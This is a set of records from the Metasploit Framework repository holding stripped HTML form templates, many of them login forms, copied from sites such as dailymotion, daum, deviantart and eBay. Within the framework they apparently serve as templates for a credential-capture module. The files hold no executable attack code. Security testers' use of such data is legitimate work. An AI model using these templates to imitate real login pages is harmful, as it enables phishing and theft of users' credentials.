{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/commentcamarche.net.txt", "content": "<form name='search' action='http://www.commentcamarche.net/search/search.php3' id='search' method='get'> <input name=\"Mot\" class=\"mots_cle\" type=\"text\" value=\"\" onfocus=\"$('list_rech').style.visibility='visible';\" /><input name=\"cible\" type=\"image\" src=\"/img/btn_search_01.png\" onmouseover=\"BulleWrite('Lancer la recherche',event);\" id=\"btn_search\" value=\"\" onmouseout=\"BulleHide ();\" /></form><form action='#' method='post'> <input name=\"Identification\" type=\"hidden\" value=\"\" /><input name=\"login\" tabindex=\"1\" class=\"champs\" type=\"text\" /><input name=\"pass\" tabindex=\"2\" class=\"champs\" type=\"password\" /><input name=\"Identification\" tabindex=\"3\" class=\"btn_cnx\" type=\"submit\" onmouseover=\"BulleWrite('Connectez-vous &agrave; votre compte',event);\" value=\"\" onmouseout=\"BulleHide ();\" /></form>", "timestamp": "2025-10-24T23:40:02.438052"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/corriere.it.txt", "content": "<form class='left' action='http://sitesearch.corriere.it/forward.jsp' id='searchtool' method='post'> <input name=\"search_val\" class=\"searchinput\" type=\"text\" id=\"search_val\" /><input name=\"Go\" class=\"go\" type=\"submit\" value=\"\" /><input name=\"where\" checked class=\"where\" type=\"radio\" value=\"\" /><input name=\"where\" class=\"where\" type=\"radio\" value=\"\" /></form><form action='http://www.corriere.it/registrati/login_registrati.jsp' id='formLoginRegistrati' method='post'> <input name=\"contentPath\" type=\"hidden\" value=\"\" /></form><form action='http://www.corriere.it/corcommunity/accesso/ModificaRegistrazione.do' id='formModifica' method='post'> </form><form action='http://www.corriere.it/corcommunity/accesso/LogOut.do' id='formLogout' onsubmit='return verifica();' method='post'> <input name=\"contentPath\" type=\"hidden\" value=\"\" /></form><form name='ricFrmEcFin' method='post'> <input name=\"qsrb\" checked type=\"radio\" id=\"qAz\" onclick=\"rc_mrkcmb()\" style=\"vertical-align:middle;height:13px;margin:0px 1px 1px 0px;\" /><input name=\"qsrb\" type=\"radio\" id=\"qFo\" onclick=\"rc_mrkcmb()\" style=\"vertical-align:middle;height:13px;margin:0px 1px 0px 0px;\" /><input class=\"bhp_div_ric_inpt\" type=\"text\" id=\"qText\" style=\"vertical-align:middle;width:88px;\" /><input type=\"image\" src=\"\" value=\"\" onclick=\"doEcFnSubmit()\" style=\"margin-left:4px;vertical-align:middle;\" /></form><form name='ricercaLavoro' action='http://lavoro.corriere.it/jobs/default.aspx?StartupViewID=TableView&RunDefaultAction=true' method='get' style='height:116px; height:100px;'> <input name=\"Body\" type=\"text\" id=\"Body\" style=\"width: 138px; font-size: 10px; font-family: verdana; margin: 2px 0 2px 19px;\" /><input name=\"imageField\" src=\"\" type=\"image\" border=\"0\" style=\"margin: 4px 0 0 0;\" /></form><form name='ricercaPubblicoFormBean' action='http://www.corriere.it/trovocasa/pubblico/Ricerca.do?77tadunit=0986763a&77tentry=Ricercacasacorr' method='get' onsubmit='return onSubmitRicerca()' style='-moz-background-clip: -moz-initial; -moz-background-origin: -moz-initial; -moz-background-inline-policy: -moz-initial;'> <input name=\"contratto\" type=\"radio\" id=\"contratto\" value=\"\" onclick=\"onChangeContratto(true);viewField();\" /><input name=\"contratto\" type=\"radio\" id=\"contratto\" value=\"\" onclick=\"onChangeContratto(true);viewField();\" /><input name=\"categoria\" type=\"radio\" id=\"categoria\" value=\"\" onclick=\"onChangeCategoria(true);viewField();\" /><input name=\"categoria\" type=\"radio\" id=\"categoria\" value=\"\" onclick=\"onChangeCategoria(true);viewField();\" /><input name=\"provincia\" type=\"hidden\" id=\"provincia\" value=\"\" /><input name=\"comune\" type=\"hidden\" id=\"comune\" /><input name=\"imageField\" src=\"\" type=\"image\" border=\"0\" style=\"margin: 4px 0pt 0pt;\" /></form><form name='formRicerca' action='#' method='post'> <input name=\"USER_ORIGIN\" type=\"hidden\" value=\"\" /></form><form action='http://dizionari.corriere.it/cgi-bin/sabcol/trova' method='post' target='_self'> <input name=\"lemma\" size=\"43\" class=\"text\" type=\"text\" height=\"20\" /><input name=\"submit\" type=\"image\" src=\"\" value=\"\" alt=\"Cerca\" /></form><form action='http://dizionari.corriere.it/cgi-bin/sansing/find' method='post' target='_self'> <input name=\"lemma\" size=\"43\" class=\"text\" type=\"text\" /><input name=\"Cerca\" class=\"img-search\" type=\"image\" src=\"\" alt=\"Cerca\" /><input name=\"sez\" checked type=\"radio\" value=\"\" /><input name=\"sez\" type=\"radio\" value=\"\" /></form><form action='http://dizionari.corriere.it/cgi-bin/larfra/chercher' method='post' target='_self'> <input name=\"lemma\" size=\"43\" class=\"text\" type=\"text\" /><input name=\"Cerca\" class=\"img-search\" type=\"image\" src=\"\" alt=\"Cerca\" /><input name=\"sez\" checked type=\"radio\" value=\"\" /><input name=\"sez\" type=\"radio\" value=\"\" /></form><form action='http://dizionari.corriere.it/cgi-bin/sansted/finden' method='post' target='_self'> <input name=\"lemma\" size=\"43\" class=\"text\" type=\"text\" /><input name=\"Cerca\" class=\"img-search\" type=\"image\" src=\"\" alt=\"Cerca\" /><input name=\"sez\" checked type=\"radio\" value=\"\" /><input name=\"sez\" type=\"radio\" value=\"\" /></form><form action='http://dizionari.corriere.it/cgi-bin/sabcol/trova' method='post' target='_self'> <input name=\"lemma\" size=\"43\" class=\"text\" type=\"text\" height=\"20\" /><input name=\"submit\" type=\"image\" src=\"\" value=\"\" alt=\"Cerca\" /></form>", "timestamp": "2025-10-24T23:40:03.082224"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/crunchyroll.com.txt", "content": "<form action='http://www.crunchyroll.com/search' method='get'> <input name=\"q\" class=\"searchbox\" type=\"text\" id=\"searchbox\" value=\"\" /><input class=\"searchbtn submitbtn\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:03.447473"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/cyworld.com.txt", "content": "<form name='frmQuickLogin' action='/common/include/login_check_proc.php' method='post' onsubmit='return LoginCheck(document.frmQuickLogin);'> <input name=\"hidReturnURL\" type=\"hidden\" value=\"\" /><input name=\"hidRedirectURL\" type=\"hidden\" value=\"\" /><input name=\"txtEmail\" tabindex=\"5\" size=\"24\" class=\"txtfields\" onkeypress=\"return handleEnterQuick(this, event)\" type=\"text\" id=\"QuicktxtEmail\" value=\"\" onfocus=\"if(this.value=='Email Address') this.value='';\" onblur=\"if(!this.value)this.value='Email Address';\" /><input name=\"txtPassword\" tabindex=\"6\" size=\"24\" class=\"txtfields\" onkeypress=\"return handleEnterQuick(this, event)\" type=\"password\" id=\"QuicktxtPassword\" value=\"\" /><input tabindex=\"8\" class=\"btngo\" type=\"image\" src=\"\" height=\"21\" alt=\"Go!\" align=\"top\" width=\"32\" /><input name=\"chkRememberMe\" tabindex=\"7\" class=\"nobp lfloat\" onkeypress=\"return handleEnterQuick(this, event)\" type=\"checkbox\" id=\"QuickchkRememberMe\" value=\"\" /></form><form name='form1' action='http://us.cyworld.com/main/person_search_Wview.php?cyid=' id='form_search_top' method='post'> <input name=\"searchbtn\" class=\"nobp\" type=\"image\" src=\"\" id=\"searchbtn\" /><input name=\"search_result_user_name\" class=\"searchtxt\" type=\"text\" id=\"top_search\" value=\"\" /></form><form name='frmLogin' action='/common/include/login_check_proc.php' method='post' onsubmit='return LoginCheck(this);'> <input name=\"txtEmail\" tabindex=\"1\" class=\"txt lfloat\" type=\"text\" id=\"origTxtEmail\" value=\"\" /><input name=\"txtPassword\" tabindex=\"2\" class=\"txt lfloat\" type=\"password\" value=\"\" /><input name=\"hidReturnURL\" type=\"hidden\" value=\"\" /><input name=\"c\" tabindex=\"4\" class=\"go nobp rfloat\" type=\"image\" src=\"\" /><input name=\"chkRememberMe\" tabindex=\"3\" class=\"nobp lfloat\" type=\"checkbox\" id=\"chkRememberMe\" value=\"\" /></form><form name='frmInviteProcess' action='/main/member_info_input_Wview.php' method='post'> <input name=\"hidReturnURL\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:03.771506"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/dada.net.txt", "content": "<form name='g_form_login' action='/cgi-bin/sso/login.cgi' method='post'> <input name=\"uri\" type=\"hidden\" value=\"\" /><input name=\"act\" type=\"hidden\" value=\"\" /><input name=\"dontask\" type=\"hidden\" value=\"\" /><input name=\"username\" type=\"text\" id=\"login\" value=\"\" /><input name=\"password\" type=\"password\" id=\"tabs_password\" value=\"\" /><input class=\"submit\" type=\"submit\" value=\"\" /></form><form name='nations' action='#' method='post' id='nations'> <input type=\"submit\" value=\"\" /></form><form action='/sso/setprefs.php' method='post' style='float:right; padding-right:5px;'> <input name=\"uri\" type=\"hidden\" id=\"uri\" value=\"\" /></form><form name='searchf' method='post' onsubmit='return check_form();'> <input name=\"gquery\" class=\"text_search\" type=\"text\" id=\"gquery\" value=\"\" onfocus=\"this.value='';\" /><input name=\"sp_tld\" type=\"hidden\" id=\"sp_tld\" value=\"\" /><input name=\"g_site\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:04.101735"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/dailymotion.com.txt", "content": "<form class='with_urlback dmco_form_container dmco_form dmpi_header_login' action='/login' method='post'> <input name=\"form_name\" class=\"dmco_form_input dmco_form_hidden\" type=\"hidden\" id=\"form_name\" value=\"\" /><input name=\"username\" class=\"dmco_form_input dmco_form_text text\" type=\"text\" id=\"dmpi_header_login_username\" value=\"\" /><input name=\"password\" class=\"dmco_form_input dmco_form_password password\" type=\"password\" id=\"dmpi_header_login_password\" /><input name=\"login_submit\" class=\"dmco_form_input dmco_form_submit button short_input\" type=\"submit\" id=\"login_submit\" value=\"\" /><input name=\"rememberme\" class=\"dmco_form_input dmco_form_checkbox\" type=\"checkbox\" id=\"dmpi_header_login_rememberme\" value=\"\" /></form><form class='dmco_form_container dmco_form dmpi_search' action='/' id='header_search' method='post'> <input name=\"form_name\" class=\"dmco_form_input dmco_form_hidden\" type=\"hidden\" id=\"header_search_form_name\" value=\"\" /><input name=\"search\" class=\"dmco_form_input dmco_form_text text\" type=\"text\" id=\"header_search_search\" value=\"\" /><input name=\"submit\" class=\"dmco_form_input dmco_form_submit button short_input\" type=\"submit\" id=\"header_search_submit\" value=\"\" /></form><form class='dmco_form_container dmco_form dmpi_search' action='/' id='footer_search' method='post'> <input name=\"form_name\" class=\"dmco_form_input dmco_form_hidden\" type=\"hidden\" id=\"footer_search_form_name\" value=\"\" /><input name=\"search\" class=\"dmco_form_input dmco_form_text text\" type=\"text\" id=\"footer_search_search\" value=\"\" /><input name=\"submit\" class=\"dmco_form_input dmco_form_submit button short_input\" type=\"submit\" id=\"footer_search_submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:04.457966"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/dantri.com.vn.txt", "content": "<form name='HomePg' action='Default.aspx' method='post' id='HomePg'> <input name=\"__VIEWSTATE\" type=\"hidden\" id=\"__VIEWSTATE\" value=\"\" /></form><form action='http://dantri.search.baamboo.com/search.aspx' method='get'> <input name=\"siteurl\" type=\"hidden\" value=\"\" /><input name=\"siteid\" type=\"hidden\" value=\"\" /><input name=\"Zone\" type=\"hidden\" value=\"\" /><input name=\"SearchPhrase\" size=\"16\" type=\"text\" onkeyup=\"telexingVietUC(this,event);\" value=\"\" onfocus=\"if (this.value=='T\u00ecm ki\u1ebfm') this.value='';\" style=\"BORDER-RIGHT:#215dc6 1px solid; BORDER-TOP:#215dc6 1px solid; FONT-SIZE:11px; BORDER-LEFT:#215dc6 1px solid; WIDTH:102px; BORDER-BOTTOM:#215dc6 1px solid; FONT-FAMILY:Arial,Verdana,Tahoma; BACKGROUND-COLOR:#ffffff\" onblur=\"if (this.value=='') this.value='T\u00ecm ki\u1ebfm';\" /><input name=\"Search$btnSubmit\" type=\"image\" src=\"/Images/ttvn/search.gif\" id=\"Search_btnSubmit\" align=\"absmiddle\" style=\"border-width:0px;height:16px;width:30px;\" /><input name=\"Search$SearchIn\" type=\"radio\" id=\"Search_rdoZone\" value=\"\" /><input name=\"Search$SearchIn\" checked=\"checked\" type=\"radio\" id=\"Search_rdoAll\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:04.789119"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/daum.net.txt", "content": "<form name='search' action='http://search.daum.net/search?t__nil_searchbox=btn&w=tot' id='search' method='get' onsubmit='return searchsubmit()'> <input name=\"t__nil_searchbox\" type=\"hidden\" value=\"\" /><input name=\"w\" type=\"hidden\" value=\"\" /><input name=\"sType\" checked=\"checked\" title=\"\ud1b5\ud569\uac80\uc0c9\" type=\"radio\" id=\"sType_tot\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"sType\" title=\"\uce74\ud398\" type=\"radio\" id=\"sType_cafe\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"sType\" title=\"\ube14\ub85c\uadf8\" type=\"radio\" id=\"sType_blog\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"sType\" title=\"\uc2e0\uc9c0\uc2dd\" type=\"radio\" id=\"sType_knowledge\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"sType\" title=\"\uac8c\uc2dc\ud310\" type=\"radio\" id=\"sType_board\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"sType\" title=\"\uc6f9\" type=\"radio\" id=\"sType_dir\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"sType\" title=\"\ub274\uc2a4\" type=\"radio\" id=\"sType_news\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"sType\" title=\"\uc74c\uc545\" type=\"radio\" id=\"sType_musictab\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"sType\" title=\"\uc774\ubbf8\uc9c0\" type=\"radio\" id=\"sType_img\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"sType\" title=\"\ub3d9\uc601\uc0c1\" type=\"radio\" id=\"sType_vclip\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"sType\" title=\"\uc0ac\uc804\" type=\"radio\" id=\"sType_dic\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"sType\" title=\"\ubc31\uacfc\uc0ac\uc804\" type=\"radio\" id=\"sType_100\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"sType\" title=\"\uc601\uc5b4\uc0ac\uc804\" type=\"radio\" id=\"sType_endic\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"sType\" title=\"\uc601\uc601\uc0ac\uc804\" type=\"radio\" id=\"sType_eedic\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"sType\" title=\"\uad6d\uc5b4\uc0ac\uc804\" type=\"radio\" id=\"sType_krdic\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"sType\" title=\"\uc911\uc5b4\uc0ac\uc804\" type=\"radio\" id=\"sType_cndic\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"sType\" title=\"\ud55c\uc790\uc0ac\uc804\" type=\"radio\" id=\"sType_handic\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"sType\" title=\"\uc77c\uc5b4\uc0ac\uc804\" type=\"radio\" id=\"sType_jpdic\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"sType\" title=\"\ucc45\" type=\"radio\" id=\"sType_book\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"sType\" title=\"\uc1fc\ud551\ud558\uc6b0\" type=\"radio\" id=\"sType_shop\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"sType\" title=\"\uc9c0\uc5ed\" type=\"radio\" id=\"sType_yp\" value=\"\" onclick=\"selectSchType(this);\" /><input name=\"q\" tabindex=\"1\" size=\"55\" class=\"type-text\" title=\"\uac80\uc0c9\uc5b4 \uc785\ub825\" type=\"text\" id=\"q\" onkeyup=\"search_clearbg();\" value=\"\" onfocus=\"focusPosition=this;\" onmousedown=\"search_clearbg(true);\" onblur=\"searchFousOut(this)\" /><input name=\"search\" class=\"type-btn\" type=\"submit\" value=\"\" /></form><form name='loginform' action='http://login.daum.net/Mail-bin/login.cgi?dummy=1497793077' id='loginform' method='post' onsubmit='return BeforeSumit(this);'> <input name=\"id\" tabindex=\"2\" title=\"\uc544\uc774\ub514\uc785\ub825\" type=\"text\" id=\"id\" value=\"\" onfocus=\"focusPosition=this;input_clearbg('id');\" maxlength=\"15\" /><input name=\"saved_id\" title=\"\uc544\uc774\ub514\uc800\uc7a5\" type=\"checkbox\" id=\"sid\" /><input name=\"pw\" type=\"hidden\" value=\"\" /><input name=\"enpw\" tabindex=\"3\" title=\"\ube44\ubc00\ubc88\ud638\uc785\ub825\" type=\"password\" id=\"enpw\" value=\"\" onfocus=\"focusPosition=this;input_clearbg('enpw');\" maxlength=\"32\" /><input tabindex=\"4\" title=\"\ub85c\uadf8\uc778\" class=\"type_button\" type=\"image\" src=\"\" /></form><form name='stock' action='http://stock.finance.daum.net/stockSearchNewsAction.do?commend=search&t__nil_stocknews=btn' id='stock' method='post' onsubmit='return stocksubmit()' target='_top'> <input name=\"code\" title=\"\uc8fc\uac00\uc870\ud68c\" type=\"text\" id=\"code\" value=\"\" onfocus=\"this.value='';\" /><input title=\"\uc870\ud68c\" type=\"image\" src=\"\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:05.171882"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/dealtime.com.txt", "content": "<form action='/xFS' id='frmGSRequest' method='get' onsubmit='return validateInput(this.KW);' target='_top'> <input name=\"KW\" class=\"schInput2\" type=\"text\" id=\"searchTxtField\" value=\"\" /><input name=\"FN\" type=\"hidden\" value=\"\" /><input class=\"vMid\" type=\"image\" src=\"\" value=\"\" alt=\"Go\" /></form>", "timestamp": "2025-10-24T23:40:05.533616"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/depositfiles.com.txt", "content": "<form enctype='multipart/form-data' action='http://upload4.depositfiles.com/en/' id='upload_form' method='post' onsubmit='return check_form()' target='uploadframe' style='display:inline'> <input name=\"MAX_FILE_SIZE\" type=\"hidden\" value=\"\" /><input name=\"UPLOAD_IDENTIFIER\" type=\"hidden\" value=\"\" /><input name=\"go\" type=\"hidden\" value=\"\" /><input name=\"files\" size=\"58\" class=\"input_file\" type=\"file\" id=\"files\" /><input name=\"archive_password\" class=\"input_text\" type=\"text\" id=\"archive_password\" maxlength=\"250\" /><input name=\"receivers\" class=\"input_text\" type=\"text\" /><input name=\"email\" class=\"input_text\" type=\"text\" id=\"email\" value=\"\" maxlength=\"50\" /><input name=\"agree\" class=\"chbox\" type=\"checkbox\" id=\"agree\" value=\"\" /><input title=\"Upload Now\" type=\"image\" src=\"\" height=\"39\" alt=\"Upload Now\" width=\"131\" /></form><form action='http://depositfiles.com/en/login.php' method='POST'> <input name=\"go\" type=\"hidden\" value=\"\" /><input name=\"login\" class=\"input_text\" type=\"text\" value=\"\" /><input name=\"password\" class=\"input_text\" type=\"password\" /><input type=\"image\" src=\"\" height=\"29\" alt=\"Sign In\" width=\"69\" /></form>", "timestamp": "2025-10-24T23:40:05.868836"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/deviantart.com.txt", "content": "<form action='http://www.deviantart.com/users/login' method='post'> <input name=\"ref\" type=\"hidden\" value=\"\" /><input name=\"username\" class=\"itext\" onkeypress=\"if (window.event && window.event.keyCode == 13)this.form.submit();\" type=\"text\" /><input name=\"password\" class=\"itext\" onkeypress=\"if (window.event && window.event.keyCode == 13)this.form.submit();\" type=\"password\" /><input name=\"action\" class=\"ibutton\" type=\"submit\" value=\"\" style=\"display:none\" /></form><form class='' action='http://search.deviantart.com' id='searchForm' method='get'> <input name=\"section\" type=\"hidden\" id=\"searchSection\" value=\"\" /><input name=\"qh\" type=\"hidden\" id=\"searchQH\" value=\"\" /><input name=\"q\" class=\"sleekSearchInput\" type=\"text\" id=\"searchInput\" accesskey=\"s\" value=\"\" /><input type=\"submit\" id=\"searchButton\" value=\"\" /></form><form action='#' onsubmit='return false;' method='post'> <input name=\"pollid\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:06.219305"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/doubleclick.com.txt", "content": "<form name='aspnetForm' action='index.aspx' method='post' id='aspnetForm'> <input name=\"__VIEWSTATE\" type=\"hidden\" id=\"__VIEWSTATE\" value=\"\" /><input name=\"ctl00$txt_search\" class=\"txt_search\" type=\"text\" id=\"ctl00_txt_search\" value=\"\" onfocus=\"doClear(this)\" onblur=\"doBlur(this)\" /><input name=\"ctl00$btn_search\" title=\"Search\" class=\"but_search\" type=\"submit\" id=\"ctl00_btn_search\" value=\"\" onclick=\"SubmitSearch('ctl00_txt_search');return false;\" /><input name=\"searchtext\" type=\"hidden\" id=\"searchtext\" /></form>", "timestamp": "2025-10-24T23:40:06.855855"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/download.com.txt", "content": "<form name='uloginForm' action='/1324-4_4-133.html?tag=unilogin' id='uloginForm' method='post' style='display: none;'> <input name=\"EMAILADDR\" class=\"mtx_unilog_txtbox1\" type=\"text\" value=\"\" onfocus=\"javascript:this.value=''\" /><input name=\"PASSWORD\" size=\"15\" class=\"mtx_unilog_txtbox2\" type=\"password\" id=\"uloginPass\" value=\"\" onfocus=\"javascript:this.value=''\" maxlength=\"20\" /><input class=\"autoMouseOver\" type=\"image\" src=\"\" border=\"0\" value=\"\" height=\"20\" alt=\"Go\" onclick=\"this.form.submit()\" width=\"32\" /></form><form name='tsearch' action='/3120-20_4-0.html' method='get' id='rb_srch'> <input name=\"qt\" size=\"20\" class=\"rb_srch_box\" onkeypress=\"return trapSearchKey(event, 13, function(){sendSearchHelper('/3120-20_4-0.html','rb_srch','rb_srch_tg')});\" type=\"text\" maxlength=\"255\" /><input name=\"tag\" type=\"hidden\" value=\"\" /><input name=\"submit\" class=\"rb_srch_go\" type=\"image\" src=\"\" /></form><form name='fsearch' class='rb_pft_form' action='/3120-20_4-0.html' method='get' id='rb_srch_ftr'> <input name=\"qt\" size=\"12\" class=\"rb_bsrch_box\" onkeypress=\"return trapSearchKey(event, 13, function(){sendSearchHelper('/3120-20_4-0.html','rb_srch_ftr','rb_srch_ftr_tg')});\" type=\"text\" maxlength=\"255\" /><input name=\"tag\" type=\"hidden\" value=\"\" /><input name=\"submit\" class=\"rb_bsrch_go\" type=\"image\" src=\"\" alt=\"Go\" /></form><form class='rb_ft_srch'> </form>", "timestamp": "2025-10-24T23:40:07.166797"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/eastmoney.com.txt", "content": "<form name='form11' action='http://quote.eastmoney.com/quote.asp' method='post' id='form11' onsubmit='return where1(this)'> <input name=\"StockCode\" size=\"22\" class=\"gn_Box\" type=\"text\" onmouseover=\"this.focus()\" value=\"\" onfocus=\"this.select()\" onclick=\"if (this.value=='\u8f93\u4ee3\u7801\u3001\u540d\u79f0\u6216\u62fc\u97f3\u7f29\u5199') this.value=''\" maxlength=\"6\" onblur=\"if (this.value =='') this.value='\u8f93\u4ee3\u7801\u3001\u540d\u79f0\u6216\u62fc\u97f3\u7f29\u5199'\" /><input name=\"serch_quote\" class=\"span31\" src=\"\" type=\"submit\" value=\"\" /></form><form name='formsl' action='http://quote.eastmoney.com/quote.asp' method='post' id='formsl' onsubmit='return quotesearch(this)'> <input name=\"StockCode\" class=\"text\" type=\"text\" onmouseover=\"this.focus()\" id=\"StockCode\" value=\"\" onfocus=\"this.select()\" onclick=\"if (this.value=='\u8f93\u5165\u4ee3\u7801\u6216\u7b80\u79f0') this.value=''\" style=\"float:left;margin-top:3px;padding-top:2px;height:14px;width:95px;background-color:#eeeeee;font-size:12px;\" onblur=\"if (this.value =='') this.value='\u8f93\u5165\u4ee3\u7801\u6216\u7b80\u79f0'\" /><input src=\"\" type=\"image\" style=\"float:left;margin-left:1px;margin-top:0px;padding-top:0px;height:26px;\" /></form><form name='form1' action='vote_look1.asp?action=vote' method='post' target='_blank'> <input name=\"radio\" class=\"vote\" type=\"radio\" value=\"\" /><input name=\"radio\" class=\"vote\" type=\"radio\" value=\"\" /><input name=\"radio\" class=\"vote\" type=\"radio\" value=\"\" /><input name=\"Submit2\" class=\"anniu\" type=\"submit\" value=\"\" /><input name=\"button\" class=\"anniu\" type=\"button\" value=\"\" onclick=\"javascript:window.open('vote_look1.asp?action=look')\" /></form><form name='form1' action='vote_look2.asp?action=vote' method='post' target='_blank'> <input name=\"radio\" class=\"vote\" type=\"radio\" value=\"\" /><input name=\"radio\" class=\"vote\" type=\"radio\" value=\"\" /><input name=\"radio\" class=\"vote\" type=\"radio\" value=\"\" /><input name=\"Submit2\" class=\"anniu\" type=\"submit\" value=\"\" /><input name=\"button\" class=\"anniu\" type=\"button\" value=\"\" onclick=\"javascript:window.open('vote_look2.asp?action=look')\" /></form><form name='search_form' action='' id='search_form' onsubmit='return gowhere(this)'> <input name=\"tn\" type=\"hidden\" /><input name=\"ct\" type=\"hidden\" /><input name=\"lm\" type=\"hidden\" /><input name=\"z\" type=\"hidden\" /><input name=\"select\" type=\"hidden\" id=\"select\" value=\"\" /><input name=\"rn\" type=\"hidden\" /><input name=\"word\" size=\"12\" type=\"text\" onmouseover=\"this.focus()\" id=\"word\" value=\"\" onfocus=\"this.select()\" onclick=\"if (this.value=='\u8bf7\u8f93\u5165\u5173\u952e\u5b57') this.value=''\" style=\"height:15px; border:1px solid #000\" onblur=\"if (this.value =='') this.value='\u8bf7\u8f93\u5165\u5173\u952e\u5b57'\" /><input name=\"_si\" type=\"image\" src=\"\" id=\"_si\" /></form>", "timestamp": "2025-10-24T23:40:07.938098"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/easy-share.com.txt", "content": "<form action='http://www.easy-share.com/cgi-bin/owner.cgi' id='side-login' method='post'> <input name=\"action\" type=\"hidden\" value=\"\" /><input name=\"user\" tabindex=\"1\" size=\"15\" type=\"text\" id=\"side-username\" /><input name=\"pass\" tabindex=\"2\" size=\"15\" type=\"password\" id=\"side-password\" /><input tabindex=\"4\" class=\"log2\" type=\"submit\" value=\"\" /><input name=\"lang\" type=\"hidden\" value=\"\" /><input name=\"processlogin\" type=\"hidden\" value=\"\" /></form><form action='http://www.easy-share.com/cgi-bin/owner.cgi' method='post'> <input name=\"lang\" type=\"hidden\" value=\"\" /><input name=\"action\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:08.272309"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ebay.co.uk.txt", "content": "<form name='headerSearch' action='http://search.ebay.co.uk/search/search.dll' method='get'> <input name=\"from\" type=\"hidden\" value=\"\" /><input name=\"_trksid\" type=\"hidden\" value=\"\" /><input tabindex=\"1\" name=\"satitle\" size=\"60\" class=\"srchfld\" type=\"text\" id=\"satitle\" value=\"\" maxlength=\"300\" /><input tabindex=\"2\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:08.586055"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ebay.com.au.txt", "content": "<form name='headerSearch' action='http://search.ebay.com.au/search/search.dll' method='get'> <input name=\"from\" type=\"hidden\" value=\"\" /><input name=\"_trksid\" type=\"hidden\" value=\"\" /><input tabindex=\"1\" name=\"satitle\" size=\"60\" class=\"srchfld\" type=\"text\" id=\"satitle\" value=\"\" maxlength=\"300\" /><input tabindex=\"3\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:08.949153"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ebay.com.txt", "content": "<form name='headerSearch' action='http://search.ebay.com/search/search.dll' method='get'> <input name=\"from\" type=\"hidden\" value=\"\" /><input name=\"_trksid\" type=\"hidden\" value=\"\" /><input tabindex=\"1\" name=\"satitle\" size=\"60\" class=\"srchfld\" type=\"text\" id=\"satitle\" value=\"\" maxlength=\"300\" /><input tabindex=\"3\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:09.293932"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ebay.de.txt", "content": "<form name='headerSearch' action='http://search.ebay.de/search/search.dll' method='get'> <input name=\"from\" type=\"hidden\" value=\"\" /><input name=\"_trksid\" type=\"hidden\" value=\"\" /><input tabindex=\"1\" name=\"satitle\" size=\"60\" class=\"srchfld\" type=\"text\" id=\"satitle\" value=\"\" maxlength=\"300\" /><input tabindex=\"3\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:09.627498"}
